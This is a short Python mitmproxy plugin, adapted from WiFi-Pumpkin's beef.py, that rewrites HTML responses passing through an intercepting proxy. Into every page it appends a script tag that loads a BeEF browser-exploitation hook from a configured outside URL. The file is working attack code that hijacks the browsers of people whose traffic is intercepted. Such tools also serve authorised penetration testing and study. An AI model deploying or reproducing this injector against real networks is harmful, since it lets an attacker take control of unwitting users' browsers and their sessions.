"""
This module is an adapted copy of Wifi-Pumpkin's beef.py plugin developped by Marcos Nesster.
https://github.com/P0cL4bs/WiFi-Pumpkin/blob/master/plugins/extension/beef.py

"""

import chardet
from bs4 import BeautifulSoup
from mitmproxy import ctx
from mitmproxy.models import decoded
from mitmplugin import MITMPlugin

class BeefInjector(MITMPlugin):

    def __init__(self):
        super(BeefInjector, self).__init__("beefinjector")

    def response(self, flow):
        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            encoding = chardet.detect(flow.response.content)["encoding"]
            html = BeautifulSoup(flow.response.content.decode(encoding, "ignore"), "lxml")
            if html.body:
                script = html.new_tag('script', type='text/javascript', src=self.config["beef_url"])
                html.body.append(script)
                flow.response.content = str(html)
                print "[{}] Injected BeFF url hook in page '{}'...".format(self.name, flow.request.url)

def start():
    return BeefInjector()
